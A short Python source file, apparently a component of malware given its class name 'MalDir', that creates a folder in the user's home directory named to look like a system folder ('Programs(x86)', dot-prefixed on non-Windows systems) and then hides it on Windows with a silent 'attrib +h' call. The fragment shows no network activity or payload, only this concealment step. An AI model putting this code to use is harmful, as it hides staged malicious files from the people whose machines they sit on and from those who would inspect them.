class MalDir:
    def __init__(self) -> None:
        pass

    @classmethod
    def Create(cls):
        import os
        import subprocess

        dir = os.path.expanduser('~')
        folder_name = "Programs(x86)" if os.name == 'nt' else ".Programs(x86)"
        mdir = os.path.join(dir, folder_name)
  
        try:
            os.mkdir(mdir)
        except FileExistsError:
            pass
        
        if os.name == 'nt':
            subprocess.run(f"attrib +h {mdir}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        return mdir